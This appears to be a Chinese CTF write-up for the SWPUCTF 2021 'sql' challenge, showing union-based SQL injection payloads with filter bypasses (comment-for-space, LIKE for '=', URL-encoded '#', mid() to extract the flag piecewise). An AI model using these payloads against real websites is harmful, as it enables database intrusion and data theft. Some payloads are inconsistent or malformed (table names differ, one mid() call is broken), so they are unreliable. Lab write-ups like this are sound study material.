# 【SWPUCTF 2021 新生赛】sql


# [SWPUCTF 2021 新生赛]sql

## 思路
* 使用常规字符型的联合注入起手
* 通过弹窗，在每个语句中找到对应的过滤内容，替换过滤内容
* 发现显示只有开头，使用函数获取每一段flag

## EXP

1. 一开始在做闭合中发现`--&#43;`被过滤，因为`&#43;`表示空格

   使用`#`后发现无回显，考虑用url编码`%23`.

2. 发现有回显位，因此用联合注入

3. 使用`order by`时发现了空格过滤 =&gt; 使用`/**/`替换绕过

4. 开始爆破表格名，使用`where table_name=&#34;&#34;`时发现了 `=` 过滤 =&gt; 使用like替换，即：

   ```
   where/**/table_name/**/like LFLF_flag
   ```

3. 同时发现`and`被过滤，直接限制表名，不要限制数据库即可
4. 得到字段后直接查字段，发现查询到的字数出现限制

```
?wllm=-1&#39;/**/union/**/select/**/1,2,flag/**/from/**/LFLF_flag
```

5.   尝试使用right()函数，发现被过滤。

6. 尝试使用mid()函数

   ```
   ?wllm=-1&#39;union/**/select/**/1,mid(flag,1,20),3/**/from/**/LTLT_flag%23
   
   ?wllm=-1&#39;union/**/select/**/1,mid(flag,21,20),3/**/from/**/LTLT_flag%23
   
   ?wllm=-1&#39;union/**/select/**/1,flag,41,20),3/**/from/**/LTLT_flag%23
   ```

   

## 总结

* 

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bsql/  

